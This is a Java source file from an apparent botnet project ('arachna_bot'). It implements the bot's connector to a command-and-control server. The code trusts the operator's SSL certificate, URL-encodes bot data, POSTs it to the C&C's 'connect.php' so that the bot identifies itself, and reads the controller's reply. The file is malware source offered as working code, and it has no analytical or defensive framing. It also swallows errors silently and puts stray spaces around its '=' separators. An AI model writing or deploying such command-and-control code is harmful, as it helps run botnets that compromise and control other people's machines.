
package arachna.arachna_bot;
import java.io.*;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;
import java.util.Properties;

/**
 * CONNECT THE BOT TO THE C&C VIA POSTs
 */
public class CC_Connector {
    // the encoded data to MIME being POSTed
    String postData;
    // The reply from the C&C
    String ccReply;
    // The URL of our C&C
    String ccURL;
    
    // SSL cert of our website trust setup
    public void setupTrust() {
        Properties systemProperties = System.getProperties();
        systemProperties.put("javax.net.ssl.trustStore", "./jssecacerts");
        System.setProperties(systemProperties);
    }
    
    // empty constructor
    public CC_Connector() {
        
    }
    
    /**********************************************************
     * MAIN CONSTRUCTOR
     * 
     * CONTAINS
     * 
     * 2 dimensional array, which holds the data which the bot
     * will POST to the C&C
     * 
     * the URL where the bot will POST
     * 
     * check if we are working in debug mode
     * @param thePostArray
     * @param the_CC_URL
     * @param debug
     * @throws java.io.IOException
     **********************************************************/
    
    public CC_Connector(String[][] thePostArray, String the_CC_URL,
                        Boolean debug) throws IOException {
        
        // create the data in the POST
        postData = "";
        for (String[] thePostArray1 : thePostArray) {
            try {
                postData += URLEncoder.encode(thePostArray1[0], "UTF-8") + " = " + URLEncoder.encode(thePostArray1[1], "UTF-8") + "&";
            }catch(UnsupportedEncodingException e) {
            }
        }
        
        // get rid of & in postdata
        postData = postData.substring(0, postData.length() -1);
        
        ccURL = the_CC_URL;
        ccReply = "noResponse";
        
        try {
            URL url;
            
            // the bot identifies itself
            // sends that info through POST
            url = new URL(ccURL + "connect.php");
            
            if(debug) {
                System.out.println("--------BEGIN POST DATA--------");
                System.out.println(ccURL);
                System.out.println(postData);
                System.out.println("--------END POST DATA--------");
            }
            
            URLConnection conn = url.openConnection();
            conn.setDoOutput(true);
            BufferedReader rd;
            try (OutputStreamWriter wr = new OutputStreamWriter(conn.getOutputStream())) {
                wr.write(postData);
                wr.flush();
                // bot gets a response from the C&C
                String reply = "";
                rd = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                String line;
                while ((line = rd.readLine()) != null) {
                    reply += line;
                }   if (reply != null && ! reply.equals("")) {
                    ccReply = reply;
                }
            }
            rd.close();
        } catch (Exception e) {
        }
    }
}
